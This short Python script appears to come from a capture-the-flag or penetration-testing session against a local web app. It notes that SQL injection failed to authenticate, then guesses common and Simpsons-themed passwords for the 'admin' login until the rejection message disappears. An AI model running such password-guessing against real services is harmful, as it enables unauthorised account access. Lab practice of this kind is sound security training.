import requests

url = "http://127.0.0.1:32960/index.php"

print("=== Critical Finding Analysis ===\n")
print("Both responses show: 'Oh Sorry but...you are not the admin :( '")
print("This indicates:\n1. The app checks if authenticated user is 'admin'")
print("2. SQL injection is NOT producing successful authentication\n")

# Get complete full responses
print("=== Full Failed Login Response ===")
resp_fail = requests.get(url, params={'username': 'wrong', 'password': 'wrong'})
print(resp_fail.text)

print("\n" + "="*80 + "\n")

# Let's verify if there's a valid login at all
# Try common passwords with admin
common_passwords = ['admin', 'password', '123456', 'springfield', 'simpson', 'simpsons']
for pwd in common_passwords:
    resp = requests.get(url, params={'username': 'admin', 'password': pwd})
    if 'not the admin' not in resp.text:
        print(f"[!!!] SUCCESS with password '{pwd}'!")
        print(resp.text)
        break
    print(f"admin:{pwd} - Failed")
else:
    print("None of the common passwords worked for 'admin' user")

